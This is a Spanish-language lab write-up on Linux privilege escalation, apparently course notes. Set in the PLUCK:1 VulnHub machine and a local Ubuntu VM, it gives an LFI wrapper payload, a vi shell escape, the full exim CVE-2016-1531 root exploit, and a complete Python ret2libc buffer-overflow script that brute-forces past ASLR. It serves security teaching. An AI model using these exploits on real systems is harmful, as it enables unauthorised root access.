------
- Tags: #privilege #escalation #binarios
------
# Explicación

> Analizaremos cómo elevar nuestros privilegios de usuario mediante la explotación de dos binarios diferentes como ejemplos ilustrativos.

El primer ejemplo se enfoca en explotar el binario legítimo **exim-4.84-7**, que presenta una vulnerabilidad identificada como **CVE-2016-1531**. Esta vulnerabilidad permite a un atacante ejecutar comandos privilegiados mediante el abuso de ciertas variables de entorno. Estudiaremos cómo aprovechar esta vulnerabilidad para escalar privilegios y acceder a funciones restringidas.

El segundo ejemplo aborda un **Buffer Overflow** en un binario personalizado en una máquina **Linux** de **32 bits** con **protecciones activas** y **ASLR** habilitado. En este caso, nos centraremos en explotar un **ret2libc** en un binario que posee permisos SUID y cuyo propietario es root. A través del buffer overflow, demostraremos cómo inyectar comandos privilegiados y, en consecuencia, elevar los privilegios de usuario.

Lo que queremos es que esto sirva para demostrar cómo ciertos binarios, tanto legítimos como personalizados, pueden ser explotados para obtener privilegios elevados, lo que destaca la importancia de una adecuada configuración y protección en los sistemas.

----------
# Explotación

## Binario ``exim-4.84-7``

Lo primero que haremos será ingresar al siguiente [link](https://www.vulnhub.com/entry/pluck-1,178/) para descargar la ISO de la máquina **PLUCK: 1**, luego le damos doble click y la desplegamos en nuestro VMware con las opciones ya pre-establecidas, no hace falta modificar nada, por lo tanto una vez iniciada ya podemos comenzar.

-------

Haremos el reconocimiento básico con la herramienta ``nmap`` y luego nos vamos a dirigir al navegador ya que detectamos el **puerto 80 abierto**.

![[Binarios 1.png]]

Al notar esa sección de la URL vamos a utilizar un **wrapper** que hemos visto antes el cual es el siguiente.

- ``192.168.0.3/index.php?page=php://filter/convert.base64-decode/resource=/etc/passwd``

Con este Wrapper si tenemos capacidad de lectura podríamos leer el archivo ``/etc/passwd`` pero en **Base64**, por lo tanto nosotros tendríamos que decodificarlo. Además podríamos ver el código de la sección ``admin.php`` de la web, de esta manera podríamos obtener más pistas.

Si decodificamos el resultado del ``/etc/passwd`` veremos lo siguiente.

![[Binarios 2.png]]

Ese usuario ``backup-user`` nos llama la atención porque nos indica una ruta de supuesto "*backup*" por lo tanto en la URL **colocaremos dicha ruta**.

- ``192.168.0.3/index.php?page=php://filter/convert.base64-decode/resource=/usr/local/scripts/backup.sh``

Decodificamos el resultado y indagamos.

![[Binarios 3.png]]

Tenemos que entender que **TFTP es un protocolo de transferencia** muy simple semejante a una versión básica de **FTP**. 
FTP utiliza los puertos 21 y 20, mientras que TFTP utiliza el puerto **69**.

Nosotros en nuestra máquina podemos instalar la herramienta ``tftp`` con apt install ``tftp`` de esta forma podríamos conectarnos a la máquina víctima de esta forma.

- ``tftp 192.168.0.3``

Por lo tanto podríamos intentar descargarnos con ``get`` ese archivo ``backup.tar`` que nos decía la pista anterior.

- ``get backup.tar``

Ahora simplemente descomprimimos dicho archivo con ``tar -xvf backup.tar`` y como podemos ver **tenemos el backup de la máquina** por completo.

Si hacemos uso de ``tree`` podremos ver en forma de **árbol** todo el contenido del backup

![[Binarios 4.png]]

Lo que nos llama la atención a nosotros es que el usuario **Paul** posee **claves publicas** y **privadas** de backup, por lo tanto haciendo Fuzzing intentaremos ver cual es la correcta para **conectarnos** a través de **SSH**.

![[Binarios 5.png]]

Todo esto lo hacemos con el comando ``ssh paul@192.168.0.3 -i (archivo con la key que queramos probar)``, en este caso la clave correcta es la que contiene el archivo ``id_key4``.

Al conectarnos veremos un panel extraño, este panel si miramos nuevamente el ``/etc/passwd`` veremos que corresponde a un ``/usr/bin/pdmenu`` que está asignado al usuario **Paul**. Por lo tanto ahora nuestro objetivo es intentar salir de esta menú y ganar acceso a una **Bash**.

La opción viable en este caso es abusando de la sección ``Edit File`` del ``pdmenu``.

![[Binarios 6.png]]

Podemos ir a la web [GTFObins](https://gtfobins.github.io/gtfobins/vi/#shell) para buscar una forma de conectarnos a una **shell** desde el editor de archivos ``vi``.

![[Binarios 7.png]]

Copiamos el código de la opción *(b)*, nos dirigimos con el editor a cualquier archivo, en mi caso iré al ``/etc/passwd``, luego presionamos ``:`` para abrir el campo de comandos en la parte inferior y **ahí colocamos el código**.

Con esto **ganaremos acceso al usuario Paul con una Bash** que podemos hacerla más cómoda utilizando ``export SHELL=/bin/bash`` y luego ejecutar ``/bin/bash``.

![[Binarios 8.png]]

-----

Una vez dentro buscaremos formas de escalar nuestro privilegio, en este caso para aprender a explotar el binario de esta sección, haremos un ``find / -perm -4000 2>/dev/null`` y el binario que nos interesa es el ``/usr/exim/bin/exim-4.84-7``.

**Exim** es un agente de transporte de correo desarrollado por la Universidad de Cambridge y puede ser utilizado en la mayoría de los sistemas Unix​.

Como nosotros vemos que este binario posee una versión *4.84-7* indagaremos con la herramienta ``searchsploit`` para ver si existe alguna **vulnerabilidad**.

![[Binarios 9.png]]

Descargamos el archivo con ``searchsploit -m 39459`` y nos lo pasamos a la máquina víctima montando un servidor en nuestra máquina con ``python -m http.server 80`` para en la máquina víctima yendo al directorio ``/tmp/`` hacer un ``wget nuestra-ip/39549.txt``, de esta manera ya tendríamos el exploit en el laboratorio. Lo único que queda es darle permisos de ejecución al archivo.

**Script**

```sh
cat > /tmp/root.pm << EOF
package root;
use strict;
use warnings;

system("/bin/sh");
EOF
PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps
```

![[Binarios 10.png]]

De esta forma habríamos escalado privilegios de forma satisfactoria.

-----
## Binario vulnerable a Buffer Overflow Linux x86 (32 Bits)

Recomiendo ver la sección de [[Introducción al Buffer Overflow]] antes de realizar esto ya que ahí se explican conceptos básicos que se dan por sabidos en este caso.

Ingresaremos a la web https://releases.ubuntu.com/16.04/ y descargaremos la versión de *32 Bits*.

![[Binarios 11.png]]

Ahora lo que quedas es montar esta imagen en nuestro **VMware** colocándole las características:

- ``Store virtual disk as a sigle file``
- ``Bridged``
- ``Replicate Physical Network connection state``

Simplemente encendemos la máquina y esperamos a que inicie.

----

Algo adicional a la instalación de la máquina es descargar **el binario personalizado** https://hack4u.io/wp-content/uploads/2023/04/custom vulnerable a **BOF** quitándole el ``.txt`` del final y otorgándole permisos de ejecución, todo esto dentro de la máquina víctima. Además para una mayor comodidad haremos un ``apt update`` y un ``apt install ssh``.

Haremos un ``service ssh start`` en la máquina victima y en nuestra máquina de atacante una vez reconozcamos la IP de la otra, entraremos con un ``ssh usuario@ip-máquina`` y proporcionamos la **contraseña** que habíamos asignado cuando la desplegamos. De esta forma ya estaremos dentro de la máquina y lo que queda es **pasar el binario** ``custom`` a la misma.
Para pasar el binario de nuestra máquina host a la máquina Ubuntu simplemente montamos un servidor **en el directorio donde tenemos el binario** con ``python3 -m http.server 80`` y en la máquina Ubuntu realizamos un ``wget nuestra.ip/custom`` y listo. 
==Recomendación== de meter el binaro ``custom`` en la ruta ``/usr/bin/custom`` y darle permisos de ejecución ``chmod +x custom`` y permisos a nivel de **SUDOERS** modificando el archivo  ``/etc/sudoers``, de esta manera podremos ejecutarlo estando en cualquier directorio, ya que el **PATH** contempla la ruta ``/usr/bin/`` para la ejecución de ``custom`` de forma relativa.

![[Binarios 12.png]]

-------

Instalaremos un par de herramientas que vamos a estar utilizando para realizar el **Buffer Overflow**

- ``apt install gdb`` para realizar el **Debugging**, es decir observar a bajo nivel el comportamiento del binario.
- ``apt install git``
- ``apt install binutils`` para utilizar ``readelf`` que se utiliza para mostrar información acerca del contenido que posee un binario con formato **ELF**
- Instalaremos ``peda`` que es una herramienta que complementa a ``gdb`` para hacerla más intuitiva y atractiva.
```
git clone https://github.com/0xKira/peda ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
```

Cabe destacar que todo esto lo estamos haciendo en la máquina víctima para que sea más rápido pero ==lo ideal es trabajar en nuestra máquina de atacante== trayéndonos el binario ``custom`` y analizándolo ahí con las anteriores herramientas.

==INSTALAR LAS HERRAMIENTAS TANTO PARA ROOT COMO PARA EL USUARIO NO PRIVILEGIADO.== El **Debugging** lo vamos a hacer desde el **usuario no privilegiado**.

Ahora cuando hagamos un ``gdb`` veremos todo con colores y mucho más atractivo.

-------
### Explotación

Al utilizar el binario ``custom`` veremos que nos pide una cadena, si nosotros colocamos una cualquiera no pasará nada. Nuestro objetivo es colapsar el **binario llenándolo de caracteres**, se suele recomendar utilizar muchas veces la letra "*A*" ==Esto se explica mejor en la sección de BOF, pero sirve para que vayamos teniendo una idea de lo que vamos a ver==.

![[Binarios 13.png]]

Si nosotros con ``gdb`` nos ejecutamos el binario ``custom`` tal que así

- ``gdb /usr/bin/custom -q`` (el parámetro ``-q`` es de **quiet** para que no salga el output enorme al ingresar a la herramienta)

Ahora si nosotros hacemos un **RUN** con varias letras '*A*' tal que ``r AAAAAAAAAAAAAAAAAAAAAAAA``

![[Binarios 14.png]]

Ahora si le **agregamos** muchas letras más como lo hicimos antes para que el programa colapsara, podremos ver el contenido de los registros a bajo nivel.

![[Binarios 15.png]]

-------
#### Control del registro EIP

Nuestro objetivo como lo es en la mayoría de casos de Buffer Overflow básicos es **tener control del registro EIP** para poder enviar nuestro shellcode a través de una instrucción de tipo *JMP ESP* al ESP para que este ingrese a la Pila y sea interpretado, de esta forma podemos ejecutar comandos. Recordemos que el binario al poseer permisos a nivel de **SUDOERS** al ganar la ``bash``, lo haremos de forma privilegiada como el usuario **root**. También hacer un ``gpasswd -d c4sp sudo``

Para poder **detectar** exactamente cuantos caracteres debemos ingresar en la aplicación para crashearla, es decir, el **offset** hacemos uso de la siguiente herramienta propia de ``gdb``.

- ``pattern create 300``

De esta forma nos dará una cadena de *300 Bytes* que al pasársela al binario podremos identificar fácilmente con otra herramienta llamada ``pattern offset (valor-de-EIP-aquí)`` cuantos *Bytes* se precisan para crashearla.

![[Binarios 16.png]]

Por lo tanto ahora le pasamos esa cadena al binario con **RUN** 

- ``r 'cadena'`` siempre entre comillas simples

![[Binarios 17.png]]

- ``pattern offset 0x41384141`` o ``pattern offset $eip``

![[Binarios 18.png]]

Por lo tanto si ahora ejecutamos un comando a nivel de sistema y metemos de manera interactiva con Python la operatoria ``"A"*112 + "B"*4``

- ``r $(python -c 'print("A"*112 + "B"*4)')``

El valor del **EIP** será *42424242* que corresponde a las 4 letras "*B*" que colocamos luego del **offset**, por lo tanto ya sabemos que después de 112 letras "*A*" **los próximos 4 bytes irán al EIP**.

![[Binarios 19.png]]

-------
#### Técnica ret2libc (ASLR Habilitado y ASLR Deshabilitado)

Una vez controlemos el **EIP** nosotros tenemos que saber a donde tenemos que apuntar, por lo tanto es necesario **mirar las protecciones del binario** para tener un poco más de idea de como atacaremos.

Para mirar las protecciones simplemente dentro del ``gdb`` ejecutamos la siguiente instrucción.

- ``checksec``

![[Binarios 20.png]]

Por lo tanto tendremos que buscar una forma alternativa para poder ejecutar comandos, ya que recordemos que nuestro objetivo es **conseguir una consola como root**.
Como no hay más protecciones además de **NX**, en estos casos podría ser factible un ``ret2libc``.

**Ret2libc** (o **return-to-libc**) es una técnica de explotación que se utiliza para ejecutar código arbitrario en un sistema vulnerable, aprovechando las funciones de la librería estándar de C, **``libc``**, sin la necesidad de inyectar código malicioso directamente en la memoria. Se usa comúnmente en sistemas que tienen protecciones como **DEP** (Data Execution Prevention), que impiden la ejecución de código en la pila.

En nuestro caso queremos aplicar una **llamada a nivel de sistema** aprovechándonos del ``ret2libc``. La estructura que normalmente suele llevar esta técnica es que el **EIP** apunte a la dirección de ``system + exit + bin_sh``, para entenderlo mejor sería como cuando importamos la librería ``os`` en **python** y realizamos un ``os.system("whoami")`` de manera interactiva veremos que nos devuelve el **nombre del usuario actual** y luego **el código estado** del comando previamente ejecutado.
Es decir que dentro de ``system + exit + bin_sh``, ``system`` equivale a ``os.system``, ``exit`` equivale al **código de estado** al terminar de ejecutar el comando previo y ``bin_sh`` corresponde a donde colocamos ``whoami``, que en nuestro caso como atacantes colocaremos ``/bin/sh``.

Algo que debemos observar es si el **ASLR** está activado o desactivado, este dictamina si hay **aleatorización en las direcciónes de la memoria**, esto lo podemos verificar utilizando ``ldd /usr/bin/custom``. Esta herramienta sirve para tratar de ver las **librerías compartidas** que estén siendo llamadas de un determinado binario, por lo tanto si ejecutamos varías veces este comando y vemos que el valor de ``libc`` cambia es que **el ASLR está activado**.
##### ASLR Activado

![[Binarios 21.png]]

Esto quiere decir que el **ASLR** está **habilitado** ya que hay aleatorización en las direcciones de la memoria, esto complica un poco la labor del atacante a la hora de, aconteciéndose el Buffer Overflow lograr ejecutar la llamada al sistema que nos permita convertirnos en el usuario root.

Tenemos que entender que al estar operando contra un sistema de *32 Bits*, las direcciónes de la memoria no poseen una longitud tan extensa. Algo que podemos hacer para burlar esta protección es hacer uso de ``ldd`` para crear una secuencia que **ejecute dicho comando muchas veces**, ya que por más que sea aleatorio el valor de ``libc``, si repetimos *500 veces* el comando, veremos que **tarde o temprano se va a repetir algún valor** ya que **no tiene una longitud muy amplia**.

Primero aplicaremos un **filtro** para que solo se vea el valor de ``libc``

- ``ldd /usr/bin/custom | grep libc | awk NF{'print $NF'} | tr -d '()'``

Luego le aplicamos el **secuenciador** con bash scripting.

- ``for i in $(seq 1 100); do ldd /usr/bin/custom | grep libc | awk NF{'print $NF'} | tr -d '()'; done``

Ahora simplemente elegimos un valor cualquiera que veamos y aplicamos un ``grep`` a ese valor, en mi caso elegí el ``0xb7d6c000``. Además le aumentamos la cantidad de repeticiones del comando en el secuenciador, de esta forma verificamos que tarde o temprano el valor de ``libc`` que elegimos se va a repetir.

- ``for i in $(seq 1 10000); do ldd /usr/bin/custom | grep libc | awk NF{'print $NF'} | tr -d '()'; done | grep "0xb7d6c000"``

![[Binarios 22.png]]

De esta manera cuando elijamos una dirección especifica y ahí asignemos nuestra llamada a nivel de sistema, lo que haremos será aplicar un secuenciador para que cuando aparezca la coincidencia con la dirección elegida por nosotros nos ejecute el comando que especifiquemos.

---

Al notar que las direcciónes de la memoria son aleatorias tendríamos que utilizar **fuerza bruta** ejecutándolo muchas veces hasta que se **repita la dirección** especifica que hayamos elegido, luego de esto tendríamos que, para esa dirección base de ``libc`` que hemos elegido, **calcular las distancias** para llegar a las direcciones reales de ``system``, ``exit`` y ``"/bin/sh"`` ya que hay un pequeño margen de diferencia al ser **aleatorio** ``libc``, por lo tanto ese sería nuestro objetivo ahora.

Cabe destacar que para el script que vamos a hacer utilizamos la herramienta ``readelf`` que sirve para ver el contenido de un archivo con formato ELF, en este caso usamos el parámetro ``-s`` para ver **la tabla de símbolos** para ver ciertas funciones y sus direcciónes correspondientes que no son las reales, si no que son sus ``offsets``.

- ``ldd /usr/bin/custom`` y copiamos la ruta de ``libc``, luego se la pasamos a ``readelf``
- ``readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E " system| exit"``

![[Binarios 26.png]]

Estas no son las direcciones si no que son los ``offsets`` que vamos a **sumarle a nuestra dirección base** de ``libc`` que elegimos de todas las que nos aparecían al utilizar ``ldd`` para poder llegar a las direcciones reales de ``system`` y de ``exit``, por lo tanto copiaremos y pegaremos esto dentro del script para tener una referencia directa.

Para hallar el **offset** de ``"bin_sh"`` podemos utilizar la herramienta ``strings``.

- ``strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"`` el parámetro ``-a`` es para que escanee el archivo entero, no solo la sección data, y el ``-t`` es para que nos represente la información en ``base16`` con la ``x``

![[Binarios 27.png]]

Estos tres valores los vamos a representar en variables dentro de nuestro script y para **conseguir sus direcciones reales** tenemos que **sumar la dirección base que elegimos aleatoriamente con los ``offsets``** que conseguimos con los comandos anteriores.

Crearemos un pequeño script de python para poder emplear el ataque y la fuerza bruta para hallar las direcciones reales que nos interesan en base a todo lo que conseguimos recién.

```python
#!/usr/bin/python3

import subprocess
import sys
from struct import pack

offset = 112
before_eip = b"A"*112

# ret2libc --> system + exit + "bin_sh"

# Direccion que elegimos aleatoriamente al hacer ldd /usr/bin/custom
base_libc_addr = 0xb7d6c000

# c4sp@ubuntu:/tmp$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E " system| exit"
#    141: 0002e9e0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
#   1457: 0003adb0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0

# c4sp@ubuntu:/tmp$ strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
#  15bb2b /bin/sh

system_addr_off = 0x0003adb0
exit_addr_off = 0x0002e9e0
bin_sh_addr_off = 0x0015bb2b
# Completamos con dos ceros para completar la longitud de la direccion 0x15bb2b

# Calculando las direcciones reales a traves de la suma de la direccion base que teniamos mas el offset que conseguimos con las herramientas anteriores
system_addr = pack("<L", base_libc_addr + system_addr_off)
exit_addr = pack("<L", base_libc_addr + exit_addr_off)
bin_sh_addr = pack("<L", base_libc_addr + bin_sh_addr_off)

payload = before_eip + system_addr + exit_addr + bin_sh_addr # Aca en base a las direcciones que obtuvimos efectuamos el ret2libc --> system + exit + "bin_sh"

# Ejecutamos el programa muchas veces con un bucle infinito hasta que coincida la direccion de nuestro base_libc_addr que elegimos con ldd
# En el momento exacto que libc valga 0xb7d6c000, ganaremos acceso al usuario root

while True:

	result = subprocess.run(["sudo", "/usr/bin/custom", payload])

	if result.returncode == 0:
		print("\n\n[!] Se ha salido correctamente del programa")
		sys.exit(0)
```

Ahora cuando ejecutemos el script veremos que después de unos segundos **ganaremos acceso a una bash como usuario root**.

![[Binarios 28.png]]

------
##### ASLR Desactivado

En el caso de que **no esté activado** el **ASLR**, las direcciones de ``system``, ``exit`` y ``"/bin/sh"`` las podemos sacar directamente desde el propio ``gdb`` ya que serían estáticas.

Para este ejemplo **desactivaremos nosotros de forma manual el ASLR** cambiando el valor del archivo ``/proc/sys/kernel/randomize_va_space`` a ``0``

----

Al realizar un ``ldd /usr/bin/custom`` veremos que por mas que repitamos el comando la dirección es la misma, por lo tanto la meteríamos en el script en la variable ``base_libc_addr``

Ahora para conseguir las direcciones de ``system``, ``exit`` y ``"/bin/sh"`` podemos hacer uso dentro del ``gdb`` la siguiente instrucción ``info functions`` para **ver todas las funciónes disponibles** en el binario ``custom``. Nosotros podríamos aprovecharnos de la función ``main`` para asignarle un **Breakpoint** con ``b *main`` para que así cuando ejecutemos el programa, el flujo de este se **detenga** en el ``main`` que es donde **arranca** o **comienza** el programa como tal y de esta forma podremos hacer ciertas consultas.

![[Binarios 23.png]]

![[Binarios 24.png]]

Luego ejecutamos el programa con cualquier dato por ejemplo ``r AAAAAAAAAAA`` y automáticamente se detendrá en donde especificamos el **Breakpoint** en este caso en ``main``, ahora simplemente queda realizar las consultas deseadas, en nuestro caso podemos hacer esto.

- ``p system``
- ``p exit``
- ``find "/bin/sh"``

De esta forma obtendríamos las direcciones de ``system``, ``exit`` y ``"/bin/sh"``, por lo tanto ahora solo quedaría **apuntar con el EIP** a la dirección de ``system``, a la de ``exit`` y a la de ``"/bin/sh"``, modificando el script en sus respectivos campos.

Por lo tanto esto sería mucho más sencillo que con el **ASLR** **activado**.

![[Binarios 29.png]]